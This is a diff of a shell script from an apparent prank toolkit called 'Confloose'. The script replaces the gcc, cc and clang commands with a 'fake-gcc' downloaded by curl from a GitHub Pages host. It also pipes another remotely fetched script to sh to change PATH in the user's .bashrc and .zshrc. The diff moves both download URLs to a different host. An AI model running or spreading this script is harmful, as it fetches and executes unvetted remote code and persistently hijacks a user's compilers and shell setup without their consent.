@@ -38,7 +38,7 @@ for name in gcc cc clang; do
        && ! grep -q "confloose by leo \[fake-gcc\]" "$file" 2>/dev/null; then
         cp "$file" "$file.confloose.bak"
     fi
-    if ! curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/fake-gcc/gcc" > "$file"; then
+    if ! curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/fake-gcc/gcc" > "$file"; then
         echo "fake-gcc: download failed for $name" >&2
         rm -f "$file"
         [ -e "$file.confloose.bak" ] && mv "$file.confloose.bak" "$file"
@@ -49,5 +49,5 @@ for name in gcc cc clang; do
     chmod +x "$file"
 done
 
-echo $(curl -fsSL "${CONFLOOSE_BASE:-https://louismoretti.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-gcc" "'export PATH=\"$dir:\$PATH\"'" | sh
+echo $(curl -fsSL "${CONFLOOSE_BASE:-https://sayt-0.github.io/Confloose}/confloose/bashrc_confloose_base.sh") "fake-gcc" "'export PATH=\"$dir:\$PATH\"'" | sh
 for name in bashrc zshrc; do [ -f "$HOME/.$name" ] && ( . "$HOME/.$name" ) 2>/dev/null; done; true
